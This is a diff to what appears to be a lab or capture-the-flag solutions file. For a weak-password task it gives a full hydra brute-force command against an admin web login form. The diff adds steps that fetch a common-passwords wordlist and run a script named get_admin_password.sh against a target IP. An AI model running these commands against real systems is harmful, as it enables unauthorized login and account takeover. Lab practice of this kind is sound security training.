@@ -6,6 +6,10 @@ task_1: Low-complexity user password
 wget https://raw.githubusercontent.com/USER/REPO/BRANCH/path/to/file.txt
 (e.g. wget https://raw.githubusercontent.com/CyberSkiller/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt)
 hydra IP -s 80 -l admin -P 10k-most-common.txt -t 64 -T 64 http-post-form '/:username=^USER^&password=^PASS^&submit=Submit:failed'
+(OR YOU CAN USE SCRIPT FROM THE REPO)
+sudo apt install lynx -y && sudo apt install hydra -y (required for the script to work)
+wget https://raw.githubusercontent.com/CyberSkiller/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt
+sh get_admin_password.sh IP_ADDRESS
 
 task_2: Weak randomness session identifier
 DONE USING GUI
